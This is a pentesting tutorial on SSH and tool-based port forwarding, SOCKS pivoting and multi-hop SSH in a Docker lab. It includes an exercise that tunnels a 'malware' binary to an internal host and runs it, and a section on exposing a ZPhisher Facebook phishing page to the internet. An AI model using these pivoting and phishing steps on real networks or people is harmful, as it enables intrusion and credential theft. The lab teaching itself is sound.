It was possible to scan the internal network and you found an RDP server. How do you get this RDP server visible - you are in the terminal, right? 
An ssh client is installed at the system. To get the RDP server visible you create a remote port forwarding connection from your victim terminal to your attacker server. 
Your attacker box is a kali operating system sitting in the internet. An ssh server is running at this system.
You establish the connection and the RDP server is forwarded from the internal network outside to your server. 
After you log into kali, the RDP connection is directly visible on your server, and you can use your full arsenal of tools like
<br>
`rdesktop 127.0.0.1` to start a graphical connection to the Windows machine.
</blockquote>

## SSH

To leverage SSH for remote port forwarding, open one console window at your victim machine. Ssh with this session into your attacker box and *send* a specific server to directly your system: <br>

<pre><code class="bash">ssh -R 8888:&lt;ip+port_you_want_to_send_from_your_network&gt; user@&lt;ip_ssh_of_your_attacker_box&gt;
</code></pre>

After that you can then access the IP `127.0.0.1:8888` on our kali system to get the connection into the internal network at &lt;ip+port_you_want_to_send_from_your_network&gt;.

<pre><code class="bash">ssh -R 8888:&lt;192.168.100.100:8881&gt; user@&lt;ip_ssh_of_your_attacker_box&gt;
</code></pre>

This example would send the server at `192.168.100.100` Port `8881` from our current network you connected with ssh to your attacker box local interface at Port `8888`.

Note that a port smaller than 1024 will not work if you are not root. So 

<pre><code class="bash">ssh -R 80:&lt;192.168.100.1000:8881&gt; user@&lt;ip_ssh_of_your_attacker_box&gt;
</code></pre>

would close the connection. In addition to SSH, this applies to all subsequent tools with which we perform reverse port forwarding except plink.
So if you are not root at the system where you have the client just use a port >= 1024.

<div markdown="0">
  <blockquote>
  The task now is to send an internal web server from inside the docker infrastructure to your kali box outside.<br>
  <br>
  IP+port of the internal server you want to access: <code>192.168.2.50:80</code><br>
  Docker ID representing the victim you hacked: &lt;id_jumphost&gt;
  User Password: <code>jumphost</code>
  Docker ID representing your kali attacker box: &lt;id_outside&gt;
  SSH password for this: <code>outside</code>
  At this attacker box an ssh server is already installed.
  </blockquote>

  <p>
    <button class="btn btn-outline-primary btn-lg btn-block" type="button" data-bs-toggle="collapse" data-bs-target="#exercise_portforwarding_1" aria-expanded="false" aria-controls="exercise_portforwarding_1">
      See Answer
    </button>
  </p>
  <div class="collapse" id="exercise_portforwarding_1">
  <div class="card card-body">
  <p class="card-text">First enter the session to your victim:
<pre><code class="bash">doeti &lt;id_jumphost&gt; bash
su jumphost
ssh -R 8888:192.168.2.50:80 outside@192.168.1.3
</code></pre>

Confirm the fingerprint with yes if this is asked so that it can be added to the list of known hosts.
For the password enter <code>outside</code>
Then you can open the internal web server at the attacker box:

<pre><code class="bash">doeti &lt;id_outside&gt; bash 

netstat -antlp | grep 8888
tcp        0      0 127.0.0.1:8888          0.0.0.0:*               LISTEN      -

curl 127.0.0.1:8888
&lt;html&gt;&lt;body&gt;&lt;h1&gt;Hi from inside server&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;
</code></pre>

  </p>
  </div>
  </div>

</div>

Note 

<pre><code class="bash">ssh -R 80:&lt;192.168.100.1000:8881&gt; user@&lt;ip_ssh_of_your_attacker_box&gt;
</code></pre> 

only sends the internal server to the attack box external system at 127.0.0.1. If you want to have an internal server accessible from another IP you have to do local portforwarding at this machine again.
An example is an internal server which should be send to an external ssh server accessible from the internet after that. 

At the end you can do crazy stuff like combining local and remote portforwarding.

Imagine the following situation:

<blockquote>There is an ssh server in the internal network. You as a pentester want to install a malware on it. You also have an ssh server at the jump host.
What can you do? You can bring the inside ssh server to your attacker box using local port forwarding at the jump host. And after you managed that you can then use this
now popped up local ssh connection to send a running web server on your machine to the internal system using remote port forwarding. 
</blockquote>

Let's analyze this in a challenge:

<div markdown="0">
  <blockquote>
  The task now is to bring a malware from your kali box to the internal system using combined local and remote port forwarding.
  The server where you want to install your implant is in the inside network an has no internet connection.
  You can ssh in a jump host, and you have ssh access into the inside machine.
  <br>
  <br>
  The constraints:<br>
  Machine A outside - your kali box to start is <code>192.168.1.3</code><br>
  To enter it: <code>doeti &lt;id_outside&gt; bash</code><br> 
  The malware you want to get is this box from http://127.0.0.1:8000 into the inside_server.
  A possible way to start a server is <code>python3 -m http.server</code>
  To go inside use
  Machine B jump host inside the internal network - with internet and a ssh server running - IP:  <code>192.168.2.5</code><br>
  Connect to it: <code>doeti &lt;id_jumphost&gt; su jumphost</code><br>
  Password jumphost: <code>jumphost</code><br>
  Machine B inside_server - without internet but an ssh server running - is <code>192.168.2.50</code><br>
  Connect to it with: <code>doeti &lt;id_inside_server&gt; su inside_server</code><br> 
  Password inside_server: <code>inside_server</code><br>
  </blockquote>

  <p>
    <button class="btn btn-outline-primary btn-lg btn-block" type="button" data-bs-toggle="collapse" data-bs-target="#exercise_portforwarding_1" aria-expanded="false" aria-controls="exercise_portforwarding_1">
      See Answer
    </button>
  </p>
  <div class="collapse" id="exercise_portforwarding_1">
  <div class="card card-body">
  <p class="card-text">
<br>
First let's go on our kali box:<br>
<code>doeti &lt;id_outside&gt; bash</code><br>
Now let's bring the internal ssh server to us:<br>
<code>ssh -L 2222:192.168.2.50:22 jumphost@192.168.1.5 -Nf</code><br>
Password: <code>jumphost</code><br>
The internal ssh server is now reachable at our system.<br> 
In the next step let send our system port 8000 to the ssh server.<br>
<code>ssh -R 8888:127.0.0.1:8000 inside_server@127.0.0.1 -p 2222 -Nf</code><br>
Password: <code>inside_server</code><br>
Go in the web server, we have already an example malware created here. This is just executable which prints an ascii art skull.<br> 
<code>
cd /www<br>
/www# ls<br>
index.html  malware  malware.c<br>
</code>
Start the web server at kali port 8000 to make it reachable at the internal system port 8888, so ssh can pick it up.<br> 
Compare the remote port forwarding command before to understand why to choose port 8000. <br>
<code>
cd /www<br>
python3 -m http.server<br>
</code>
python automatically starts the web server at port 8000.<br>

Finally, let's download the malware from the inside server:<br>
<code>doeti &lt;id_inside_server&gt; su inside_server<br>
cd ~<br>
netstat -tulpen | grep 8888<br>
tcp        0      0 127.0.0.1:8888          0.0.0.0:*               LISTEN      1000       ...    -<br>
</code>
The web server is reachable at 127.0.0.1:8888 !<br>
<br>
<code>
curl http://127.0.0.1:8888<br>
&lt;html&gt;&lt;body&gt;&lt;h1&gt;Hi from outside server&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;<br>
</code>
<br>
<code>
curl -O http://127.0.0.1:8888/malware<br>
chmod u+x malware<br>
</code>
<br>
It's time to own the machine:
<code>./malware<br></code> 
<img src="{{ page.image-base | prepend:site.baseurl }}/ssh_combined_local_remote_malware.png" width="100%" alt="SSH combined local remote malware">
</p>
  </div>
  </div>

</div>

## plink

Using plink for remote port forwarding looks like:

<pre><code class="bash">doeti &lt;id_jumphost&gt; su jumphost
cd ~
echo y | wine plink.exe -x -a -T -C -noagent -ssh -l &quot;outside&quot; -pw &quot;outside&quot; -R 127.0.0.1:4444:192.168.2.50:80 192.168.1.3 -N
</code></pre>

The `echo y` delivers the character `y` so that you don't have to enter it anymore.
Often this is what you want from a pentester perspective since if you get a shell into your victim and have a non-interactive shell, it is not possible to follow commands which wants interaction from you.

After you send the server to your box you can open it there
<pre><code class="bash">doeti &lt;id_outside&gt; bash
<br>
netstat -atnp | grep 4444
tcp        0      0 127.0.0.1:4444          0.0.0.0:*               LISTEN      -     
<br>
curl 127.0.0.1:4444
&lt;html&gt;&lt;body&gt;&lt;h1&gt;Hi from inside server&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;
</code></pre>

## SSF

And with SSF:

First start the ssf server at your attacker box.

<pre><code class="bash">doeti &lt;id_outside&gt; bash 

cd ssf-linux-x86_64-3.0.0
./ssfd -p 80
</code></pre>

Side note: In this case we opened it at port 80. 80 is the port for HTTP which often is not blocked from the firewall for outbound traffic. 
So from an attacker perspective this could be a good choice if you encounter problems reaching the system.

To start a server for ports below 1024 you need to be root. Since you are admin of the kali box this should be no problem.

After you started the server enter jumphost representing a hacked victim and reverse port forward the internal system to you:

<pre><code class="bash">doeti &lt;id_jumphost&gt; bash 
su jumphost
cd ~
cd ssf-linux-x86_64-3.0.0
./ssf -R 8888:192.168.2.50:80 192.168.1.3 -p 80
</code></pre>

<img src="{{ page.image-base | prepend:site.baseurl }}/ssf_0002.png" width="100%" alt="ssf remote tcp forward">

Now at your box you can access it:

<pre><code class="bash">doeti &lt;id_outside&gt; bash 
<br>
netstat -antl | grep 8888
tcp        0      0 127.0.0.1:8888          0.0.0.0:*               LISTEN
<br>
curl http://127.0.0.1:8888
&lt;html&gt;&lt;body&gt;&lt;h1&gt;Hi from inside server&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;
</code></pre>

ssfd in the other window should show

<img src="{{ page.image-base | prepend:site.baseurl }}/ssf_0001.png" width="100%" alt="Connection to ssfd server">

In [**Port Forwarding with a tunnel - SSF**](#ssf) was described how you can secure the connection. Be aware that the files from SSF stored in the `certs` folder on the client are also the credentials for the server. 
Anyone who can get to these files can connect to your server. On the other hand, in SSF <a href="https://securesocketfunneling.github.io/ssf/#how-to-use-shell">a shell must first be activated</a>, so this access is not available by default.
Thus, it is recommended to delete all data and shutdown the server after you're done and change the files for the next time as described in ([**Port Forwarding with a tunnel - SSF**](#ssf)).

## Chisel

You can also use Chisel for remote port forwarding. To do that start your listening server at your attacker box:

<pre><code class="bash">doeti &lt;id_outside&gt;
./chisel server -p 8000 --reverse --auth pwnd:l0R3M1P5uM
</code></pre>

Connect from the victim to your listening server:

<pre><code class="bash">doeti &lt;id_jumphost&gt;
su jumphost
cd ~
./chisel client --auth pwnd:l0R3M1P5uM 192.168.1.3:8000 R:127.0.0.1:8090:192.168.2.50:80
</code></pre>

Note: You used port 8090 to map to. Like in [**Remote Port Forwarding - SSH**](#ssh-1) described if you are not root only ports >= 1024 will work.
For example if you would use port 80 you would get something like this:

<img src="{{ page.image-base | prepend:site.baseurl }}/chisel_low_port.png" width="100%" alt="Chisel Low Port">

So the easy thing to remember here is: <br> <strong>Just use ports >= 1024 to map to</strong>.

Now you can access the content you want to see at your box:

<pre><code class="bash">doeti &lt;id_outside&gt;
curl 127.0.0.1:8090
&lt;html&gt;&lt;body&gt;&lt;h1&gt;Hi from inside server&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;
</code></pre>

## ZPhisher and Remote Port Forwarding
 
Imagine you have the scenario that you want to demonstrate a phishing page as part of an awareness training or to pentest a company.

<a href="https://github.com/htr-tech/zphisher">ZPhisher</a> is a github project where you can launch a phishing site. 
With this you can choose to start the phishing page serving from localhost 127.0.0.1.
Now you can buy a ssh server where you can do reverse port forwarding. 
This brings the local service from your machine to the local service at the ssh server. The default from zphisher is 127.0.0.1:8080 
Still, your phishing page cannot be reached from the internet. To achieve this you can use one of the raw port forwarding techniques described in chapter [before](#local-port-forwarding-without-tunneling--raw-port-forwarding-) like rinetd as described in [rinetd](####rinetd).

<pre><code class="bash">&lt;your external ip&gt; 8080 127.0.0.1 8080
</code></pre>

Your external IP you can get using `ip a`.

If you deliver http://<external_ip>:8080 you will see the phishing page, but it will bring up a message that it is not secure because it is not HTTPS.

<img src="{{ page.image-base | prepend:site.baseurl }}/zphisher_http.png" width="100%" alt="">

If you want to eliminate this you need to buy a domain (e.g. <a href="https://www.godaddy.com/de-de">godaddy</a>), set the dns entry A to your IPv4 IP (AAAA to IPv6 respectively), install a web server to your server.
For example use nginx and after that use letsencrypt to install the https certificate in the server. You can get the installation instruction from <a href="https://certbot.eff.org/">https://certbot.eff.org/</a>. Choose
nginx and as system the operating system from your server. Configure nginx to make the stuff rinetd did before:

<pre><code class="bash">cat /etc/nginx/sites-enabled/proxy

server {
    listen &lt;your_external_ip:port&gt;;
    server_name &lt;domain_you_bought&gt;;

    rewrite ^(.*) https://$server_name$1 permanent;
}

server {
	listen <your_external_ip>:443;

	# SSL configuration

	server_name &lt;domain_you_bought&gt;;

	ssl on;
        ssl_certificate &lt;path_to_certificate_file_letsencrypt_showed&gt;;
	    ssl_certificate_key &lt;path_to_certificate_private_key_file_letsencrypt_showed&gt;; 

	location / {
		proxy_pass http://127.0.0.1:8080;
                proxy_set_header Host $host;
                proxy_set_header X-Real-IP $remote_addr;
                proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
                proxy_set_header X-Forwarded-Proto https;			
	}

}

</code></pre>

In this way, the locally launched phishing page can now be accessed externally from the Internet. 

Note that you should limit the time this page is online. As soon as Google crawls this page, it may be placed on a blocklist and the following warning may appear

<img src="{{ page.image-base | prepend:site.baseurl }}/zphisher_deceiptive_page.png" width="100%" alt="deceiptive page">

Let's try this in practice:

<div markdown="0">
  <blockquote>
    You have an ssh server facing to the internet (jumphost server) where nginx is installed but not running. You have your attacker box (inside server). 
    And you have a victim (outside server). Lure the victim to your facebook phishing site.  
    ZPhisher is already installed at the atacker box (at /zphisher-2.3.5).
  </blockquote>

  <p>
    <button class="btn btn-outline-primary btn-lg btn-block" type="button" data-bs-toggle="collapse" data-bs-target="#exercise_reverse_external_access" aria-expanded="false" aria-controls="exercise_reverse_external_access">
      See Answer
    </button>
  </p>
  <div class="collapse" id="exercise_reverse_external_access">
  <div class="card card-body">
  <p class="card-text">
    doeti inside_server
    cd /zphisher-2.3.5/
    ./zphisher.sh
    Enter Facebook: 01 
    Enter Traditional Page: 01
    Enter Localhost: 01
    Enter Custom Port: N

   In another window go again in inside_server:
     ssh -R 0.0.0.0:8080:127.0.0.1:8080 jumphost@192.168.2.5 -Nf
     Password: jumphost
   
   In another window go to jumphost:
     Start nginx: service nginx start
     Move default config: mv /etc/nginx/sites-enabled/default /etc/nginx/sites-available/default.old
     Create new config 

<pre><code class="bash">cat /etc/nginx/sites-enabled/proxy

server {
    listen 192.168.1.5:80;
    server_name _;

	location / {
		proxy_pass http://127.0.0.1:8080;
                proxy_set_header Host $host;
                proxy_set_header X-Real-IP $remote_addr;
                proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
                proxy_set_header X-Forwarded-Proto https;			
	}

}

</code></pre>

    Restart nginx: service nginx restart
    
    Go to the outside server: doeti outside
    Fetch facebook phishing page:

outside:root@<outside_sever>:/# curl -s http://192.168.1.5/login.html|head
<!DOCTYPE html>
<!--Designed as phishing page by KasRoudra(https://github.com/KasRoudra)-->
<html lang="en" id="facebook">
  <head>
    <meta charset="utf-8" />
    <meta
      name="referrer"
      content="origin-when-crossorigin"
      id="meta_referrer"
    />

    <img src="{{ page.image-base | prepend:site.baseurl }}/zphisher_exercise_facebook_out.png" width="100%" alt="zphisher facebook out">
  </p>
  </div>
  </div>

</div>

### Remote Port Forwarding Services

Some services also offer this procedure. They make a local server available externally via remote port forwarding:

- ngrok
- localxpose
- cloudflared

You then no longer have to worry about an HTTPS certificate or a domain entry.

The following should be noted in connection with ZPhisher:

ngrok detects malicious phishing sites fast, especially well known like zphisher and blocks them.
When testing with Zphisher, localxpose could not display the website correctly. In addition, a message is displayed on the first visit that you should only continue if you trust the site. This is only displayed the first time. After that, all other accesses are also those of other people without this message
Cloudflared sometimes had problems being available during the test period.

You can also start the tunneling services from the .server folder in zphisher. Here for example cloudflared using 127.0.0.1:8080 already started in another terminal window using zphiser:

<img src="{{ page.image-base | prepend:site.baseurl }}/zphisher_cloudflared.png" width="100%" alt="zphisher cloudflared">

# X Forwarding

If you have an X Server installed on the jump host you can use the so called *X forwarding* or termed *X11Forwarding*.

This transfers a gui application started at jump host to your computer where you started the ssh connection.

For this to work you need <code>X11Forwarding</code> enabled in the config of the ssh daemon living at the jump host. 

<img src="{{ page.image-base | prepend:site.baseurl }}/x11forwarding_sshconfig.png" width="100%" alt="X 11 Forwarding SSH Config">

If you have Docker running on a Linux machine you can check that:

<pre><code class="bash">ssh -Y -C jumphost@192.168.1.5
</code></pre>

Note: There is also an option `-X`. `-Y` is less secure but faster. `-C` starts compression to boost performance a bit.

Start access the inside url using a gui tool like firefox which also has to be installed on your host:

<pre><code class="bash">firefox http://192.168.2.50:80 &amp;
</code></pre>

<img src="{{ page.image-base | prepend:site.baseurl }}/x11forwarding.png" width="100%" alt="X 11 Forwarding">

This approach can be slow depending on what you open because all the graphical output has to be transferred.
And depending on the protocol you want to use to reach inside the network you need an x window gui tool installed at jump host which can do your protocol, besides
that you also need the tool running your machine.

plink also supports X11Forwarding using the `-X` switch.

# Dynamic Port Forwarding

The third type of port forwarding is called *dynamic port forwarding*.

Imagine you have access to all internal ips of a network without changing them. :)

This is the case for dynamic port forwarding.

Like mentioned [before](#disadvantages-local-port-forwarding) you can have problems with certificates and redirects using local port forwarding. 
This is not the case with dynamic port forwarding.

This technique uses your tunnel to make a - so called - proxy available for you. This is something in between you and your target network.
You have to configure this proxy in the tool you want to use locally. The tool will send its data through the proxy. The proxy can then be seen as an eye of a needle where all the traffic goes through into the target network.

There are 2 major protocols for a proxy: HTTP and SOCKS. 

Dynamic Port Forwarding uses <a href="https://en.wikipedia.org/wiki/SOCKS">SOCKS</a>, so we will use this in the rest of this article.
After you know a socks proxy you can use the IP and port of it to get to a foreign network without changing internal IPs - it's like if you are directly in the foreign network.
All the magic is done through SOCKS. You will get beamed into the network where the SOCKS proxy is sitting.

So how can you use it? We will look at it using two situations:

Situation 1 - an incident:

<blockquote>
You are an admin, and you get a notice that several servers in a network are unreachable. 
Due to the described incidents you do not know exactly how many are affected. 
To get a comprehensive picture you use dynamic port forwarding. 
After that you can access all IPs as if they were in your current network.
</blockquote>

Let's see this in action!

## SSH

Go in the outer box and create the dynamic port forwarding:

<pre><code class="bash">doeti &lt;id_outside&gt; 

ssh -D -4 5555 jumphost@192.168.1.5 -Nf
</code></pre>

This starts a SOCKS proxy at your computer at 127.0.0.1:5555.

After that you should be able to reach everything inside the network. 
You need a tool which can set a socks proxy IP and port:

### curl

Using curl to reach a website you can leverage:

<pre><code class="bash">
curl 192.168.2.50 -x socks5://127.0.0.1:5555
&lt;html&gt;&lt;body&gt;&lt;h1&gt;Hi from inside server&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;
</code></pre>

### proxychains

If you want to portscan server inside the network using nmap , this is the way:

Install proxychains (for ubuntu for example <code>apt-get install -y proxychains</code>).

Configure your SOCKS proxy in it:
<pre><code class="bash">tail /etc/proxychains.conf
#
#       proxy types: http, socks4, socks5
#        ( auth types supported: &quot;basic&quot;-http  &quot;user/pass&quot;-socks )
#
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to &quot;tor&quot;
socks5 	127.0.0.1 5555
</code></pre>

Run nmap using proxychains:

<pre><code class="bash">proxychains nmap 192.168.2.50 -Pn -p 80,22,21 -sT
ProxyChains-3.1 (http://proxychains.sf.net)
Starting Nmap 7.80 ( https://nmap.org ) at 2022-03-23 21:44 UTC
|S-chain|-&lt;&gt;-127.0.0.1:5555-&lt;&gt;&lt;&gt;-192.168.2.50:22-&lt;&gt;&lt;&gt;-OK
|S-chain|-&lt;&gt;-127.0.0.1:5555-&lt;&gt;&lt;&gt;-192.168.2.50:21-&lt;--timeout
|S-chain|-&lt;&gt;-127.0.0.1:5555-&lt;&gt;&lt;&gt;-192.168.2.50:80-&lt;&gt;&lt;&gt;-OK
Nmap scan report for 192.168.2.50
Host is up (0.0014s latency).

PORT   STATE  SERVICE
21/tcp closed ftp
22/tcp open   ssh
80/tcp open   http
</code></pre>

Notice nmap over proxychains has a few limitations

- There is no DNS resolution so use IP addresses
- ICMP/UDP and TCP SYN scans do not work. You can only use TCP Connect which is the flag <a href="https://nmap.org/book/scan-methods-connect-scan.html"><code>-sT</code></a>.

### firefox

If you want to run firefox in our demo you can either use [X11forwarding](#x-forwarding) or you ssh directly from your machine into the jump host.

<pre><code class="bash">ssh -D 5555 jumphost@192.168.1.5 -Nf
</code></pre>

In firefox  allow localhost for proxy (enter `about:config` and set `network.proxy.allow_hijacking_localhost` to `true`)

<img src="{{ page.image-base | prepend:site.baseurl }}/dynamic_port_forwarding_firefox_settings2.png" width="100%" alt="Dynamic Port Forwarding Firefox Settings 1">
<img src="{{ page.image-base | prepend:site.baseurl }}/dynamic_port_forwarding_firefox_settings3.png" width="100%" alt="Dynamic Port Forwarding Firefox Settings 2">

and open the settings (enter `about:preferences` in the url bar). You have to scroll down completely:

<img src="{{ page.image-base | prepend:site.baseurl }}/dynamic_port_forwarding_firefox_settings1.png" width="100%" alt="Dynamic Port Forwarding Firefox Settings 3">

and set it to your proxy:

<img src="{{ page.image-base | prepend:site.baseurl }}/dynamic_port_forwarding_firefox_settings4.png" width="100%" alt="Dynamic Port Forwarding Firefox Settings 4">

After that you should be able to open the internal server:

<img src="{{ page.image-base | prepend:site.baseurl }}/dynamic_port_forwarding_firefox_call_internal_server.png" width="100%" alt="Dynamic port forwarding firefox call internal server">

If you don't need everything anymore, you can close the ssh connection and remove the config from `about:config` and in the network settings.
A tool to make those changes with one-click available is [foxy proxy](https://getfoxyproxy.org/downloads/).

## plink

To start dynamic port forwarding with plink it's really similar:

<pre><code class="bash">doeti id_outside
wine plink -x -a -T -C -noagent -ssh -l "jumphost" -pw "outside" -D 5555 jumphost@192.168.1.5 -N
</code></pre>

So the important flag here is `-D`.

Confirm that you trust that you enter jumphost with 'y' and start the Session with pressing Return.
Open another console window from the outside system with:

<pre><code class="bash">doeti &lt;id_outside&gt;</code></pre>

Check if you can see the listening port 5555:

<img src="{{ page.image-base | prepend:site.baseurl }}/dynamic_port_forwarding_plink_1.png" width="100%" alt="Dynamic Port Forwarding plink 1">

<pre><code class="bash">curl http://192.168.2.50:80 -x socks5://127.0.0.1:5555
&lt;html&gt;&lt;body&gt;&lt;h1&gt;Hi from inside server&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;
</code></pre>

## SSF

SSF offers 2 types of dynamic port forwarding:

The first type is like SSH and plink to bring a socks proxy to you. This process is similar to local port forwarding in the sense
that you bring something to you. This time the socks proxy:

### Method 1 - Client SOCKS service

Jumphost

<pre><code class="bash">./ssfd -p 8766
</code></pre>

Outside

<pre><code class="bash">./ssf -D 8754 192.168.1.5 -p 8766 &amp;
curl http://192.168.2.50:80 -x socks5://127.0.0.1:8754
</code></pre>

### Method 2 - Remote SOCKS service

<blockquote>
Suppose you can not open a listening port because you recognise that everything is blocked by the firewall. Damn! Every single port ingoing port is blocked.
But wait! Not the outgoing port. You are at a client machine so probably HTTP and HTTPS things should work, since the user should be able to use the browser.
Let's use the reverse dynamic port forwarding of chisel!
</blockquote>

This is similar to remote port forwarding in terms that you send the socks proxy to another server.

Outside

<pre><code class="bash">./ssfd -p 9876 &
</code></pre>

You can put the process in background with `&` so that you can proceed with other commands in the same terminal window.

Jumphost

<pre><code class="bash">./ssf -F 8765 192.168.1.3 -p 9876
</code></pre>
    
Outside

<pre><code class="bash">curl http://192.168.2.50:80 -x socks://127.0.0.1:8765
&lt;html&gt;&lt;body&gt;&lt;h1&gt;Hi from inside server&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;
</code></pre>

## Chisel

Chisel is nearly the same as SSF. It also supports the two possibilities to perform dynamic port forwarding.

If you have a server where you can open listening ports to the outside you can use the first option "client Socks service":

### Method 1 - Client SOCKS service

At the jumphost start the listening server:

<pre><code class="bash">echo &quot;doeti &lt;id_jumphost&gt; su jumphost
cd ~
./chisel server -p 8000 --socks5
</code></pre>

At your Kali connect to it with the client:

<pre><code class="bash">doeti &lt;id_outside&gt; bash
./chisel client 192.168.1.5:8000 socks
</code></pre>

In another Kali terminal window open stuff from the internal network:

<pre><code class="bash">curl http://192.168.2.50:80 -x socks5://127.0.0.1:1080
&lt;html&gt;&lt;body&gt;&lt;h1&gt;Hi from inside server&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;
</code></pre>

The second other option is the remote way. 

### Method 2 - Remote SOCKS service

To do that start the chisel server at your kali system in reverse mode:

<pre><code class="bash">doeti &lt;id_jumphost&gt; bash
./chisel server -p 443 --socks5 --reverse
</code></pre>

Inside the hacked machine connect to it:

<pre><code class="bash">doeti &lt;id_jumphost&gt; su inside_client
cd ~
./chisel client 192.168.1.3:443 R:socks
</code></pre>

And then at another windows in Kali:

<pre><code class="bash">curl http://192.168.2.50:80 -x socks5://127.0.0.1:1080
</code></pre>X

## Putty

Situation 2 - Censorship:

<blockquote>You have a laptop running Windows and you're in a network environment that limits you. 
Your Internet Service Provider (ISP) does not allow you to visit certain pages. 
Instead, you arrive at a page that tells you that you are not allowed to access it or shows you other content. 
In short, the page is censored. The actual content is not available. 
What you can do: Get a server with ssh access outside the ISP's sphere of influence with a free and open connection to the outside. 
This could be a friend's or even another ISP's server. Connect to it using the port that is allowed e.g. 80 or 443 for HTTP and HTTPS.
But actually you open a SSH connection to it. 
Then set dynamic forwarding via SSH by flag and a proxy will be opened on your machine. Use it in your tools and surf freely again!
</blockquote>

Let's look into it in detail:

First you need an ssh server. For this you can search for "VPS providers". For example at <a href="https://www.vpsbenchmarks.com/compare/">https://www.vpsbenchmarks.com/compare/</a> you can can compare some of them.

For this demo I clicked an Ubuntu server. If you have a root login go to ssh server config.
The default location is `/etc/ssh/sshd_config` but sometimes it also can be found a smaller file in `/etc/ssh/sshd_config.d/` which substitutes and adds to the default configuration.
Either way uncomment `Port` and set it to `Port 80`.This way the ssh server will run at port 80.

Restart the ssh server and look if the new port is used:

<pre><code class="bash">
service ssh restart
service ssh status
</code></pre>

Output should be something like

<pre><code class="bash">date and time serverxy sshd[...]: Server listening on 0.0.0.0 port 80.
date and time serverxy sshd[...]: Server listening on :: port 80.
</code></pre>

In the Windows client install <a href="https://www.mozilla.org/en-US/firefox/">Firefox</a> and <a href="https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html">Putty</a>.

Open `Cmd` and enter:

<pre><code class="bash">putty -ssh -D 4080 -P 80 &lt;SSH Server IP&gt;
</code></pre>

This doesn't open the Putty GUI, but instead goes directly into a new window starting an ssh session.

<img src="{{ page.image-base | prepend:site.baseurl }}/putty_start_dynamic_pf_prompt.png" width="100%" alt="Putty start dynamic port forwarding prompt">

Click "Accept".

<img src="{{ page.image-base | prepend:site.baseurl }}/putty_start_dynamic_pf_prompt2.png" width="100%" alt="Putty start dynamic port forwarding prompt 2">

Enter the credentials for the server.

Open firefox, go to Settings and search for "Network Settings". In the settings change the Proxy configuration to `127.0.0.1` Port `4080` and set "Proxy DNS when using SOCKS v5" to yes.
Why do you use firefox? Chrome and Edge guide you to the windows system proxy settings which aren't capable of rerouting your domain resolution lookup into the socks proxy. 

<img src="{{ page.image-base | prepend:site.baseurl }}/firefox_proxy_settings_dns_important.png" width="100%" alt="Firefox Proxy settings and DNS">

After that you can browse to your site.

Side note: If you want it even more anonymous and without censorship use <a href="https://tails.boum.org/">Tails</a>. You can put it on a USB stick and plug it into your computer. The computer will then boot the system.

# Multi Hopping

Pentester h4xx0r:

<blockquote>You did it! You are in the company network. But wait. This is not a beginner's network. It seems to go even further. 
There are probably more network segments. You make it into the next segment! You found some credentials. 
You go from your current ssh session into the next net with a new ssh command. 
Here you make another breakthrough. 
You open the third network entering ssh into the console. 
Wow! It's a connection over a connection over a connection into the network using ssh.
Here in the shallows seems to be where the exciting servers are. 
It was really complicated to get here. Can I establish an easier connection?
</blockquote>

<div id="html" markdown="0" class="mermaid">stateDiagram-v2
[*] --> s2
s2: Network A
s3: Network B
s4: Network C
s2 --> s3
s3 --> s4</div>

This chapter is about how to easily hop over multiple SSH servers.
There are various ways to do this.

We will see that it depends on two factors:

- Which SSH version can I use?
- How convenient should further calls to the target be?

We will cover older SSH versions in the later chapter [ProxyCommand](##ProxyCommand) and talk about how you to make it more convenient in chapters 
[Establish asymmetric authorized multi hop connection](##Establish asymmetric authorized multi hop connection) and [SSH Config](###SSH Config).


x https://pcarleton.com/2016/11/10/ssh-proxy/
--> Sub-Links noch nicht gelesen
--> Netcat is a networking utility ...
--> Szenario-BEschreibung (vgl oder ergänze obige Beschreibung). Du hast im Pentest herausgefunden, wo Server aufgesetzt werden können. Du erstellst einen Rechner auf den man Zugriff über das öffentliche Netz bekommt und der gleichzeitig ins interne Netz zeigt.
Jetzt kannst du dir über die folgenden SSH-Kommandos eine direkte Shell in das interne Netz legen.
Hast du es geschafft Kontrolle über verschiedene Knotenpunkte zu geben, so kannst du sogar eine Leitung über mehrere Gateways über verschiedene Netze legen wie du gleich mit dem Schalter -J sehen wirst


If you have a newer version of SSH use "-J" to hop. Here are two example how this works, in the second there is a local port forwarding connection established through the hops:

<pre><code class="bash">doeti &lt;id_outside&gt; bash 
ssh -J jumphost@192.168.1.5,jumphost@192.168.2.111 inside_server@192.168.3.50
ssh -J jumphost@192.168.1.5 inside_server@192.168.2.50 -L 127.0.0.1:9999:127.0.0.1:80
</code></pre>

Depending on what version you have in front you have <a href="https://security.stackexchange.com/questions/92479/security-of-nested-ssh
">3 possibilities</a> exist to do secure multi hopping.
Since 2016 you can use the -J switch about what we talk in a moment.
For OpenSSH versions between 2010-2016 you can use -W switch about what we talk in chapter [-W Switch](#-w-switch).
And before that there you have to use [netcat](#port-forwarding-with-netcat-).

You can find your ssh version using

<pre><code class="bash">ssh -V
OpenSSH_...
</code></pre>

## J switch SSH

This switch was added in OpenSSH version [7.3 August 2016](https://www.openssh.com/txt/release-7.3) and is the most convenient 
command line switch to do multi hopping.

Some examples:

<pre><code class="bash">doeti &lt;id_outside&gt; bash 
ssh -J jumphost@192.168.1.5,jumphost@192.168.2.111 inside_server@192.168.3.50
ssh -J jumphost@192.168.1.5 inside_server@192.168.2.50 -L 127.0.0.1:9999:127.0.0.1:80
</code></pre>

In the first one you jump from 192.168.1.5 over 192.168.2.111 to 192.168.3.50.
The second one show local port forwarding over 192.168.1.5 and 192.168.2.50.

You will get a

<pre><code class="bash">The authenticity of host &#39;192.168.2.111 (&lt;no hostip for proxy command&gt;)&#39; can&#39;t be established.
</code></pre>

and

<pre><code class="bash">The authenticity of host &#39;192.168.3.50 (&lt;no hostip for proxy command&gt;)&#39; can&#39;t be established.
</code></pre>

But this ok, because it means that the authenticity of the servers in between cannot be stored at your local machine.
